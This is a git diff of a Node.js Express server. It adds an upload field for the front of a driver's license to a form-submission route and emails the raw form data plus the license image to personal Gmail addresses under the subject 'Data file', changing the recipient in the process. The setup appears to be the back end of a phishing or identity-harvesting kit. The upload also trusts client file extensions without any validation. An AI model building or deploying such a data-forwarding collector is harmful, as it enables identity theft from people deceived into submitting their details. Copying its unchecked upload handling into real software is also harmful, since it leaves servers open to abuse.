@@ -4,17 +4,31 @@ const fs = require("fs");
 const path = require("path");
 const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
+const multer = require("multer");
 const port = 9000;
 
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, "public")));
 
+// Set up file upload using multer
+const storage = multer.diskStorage({
+  destination: function (req, file, cb) {
+    cb(null, "uploads/");
+  },
+  filename: function (req, file, cb) {
+    const ext = path.extname(file.originalname);
+    cb(null, Date.now() + ext);
+  },
+});
+
+const upload = multer({ storage: storage });
+
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-app.post("/submit", async (req, res) => {
+app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
   try {
     const data = req.body;
 
@@ -37,9 +51,15 @@ app.post("/submit", async (req, res) => {
     // create mail options object
     const mailOptions = {
       from: "ayomiakintoye00@gmail.com",
-      to: "isaiahgabriel175@gmail.com", // recipient email address
+      to: "techmornach@gmail.com", // recipient email address
       subject: "Data file",
       text: JSON.stringify(data), // use JSON.stringify to convert the data to a string
+      attachments: [
+        {
+          filename: "DriversLicenseFront",
+          path: req.file.path,
+        },
+      ],
     };
 
     // send mail with defined transport object
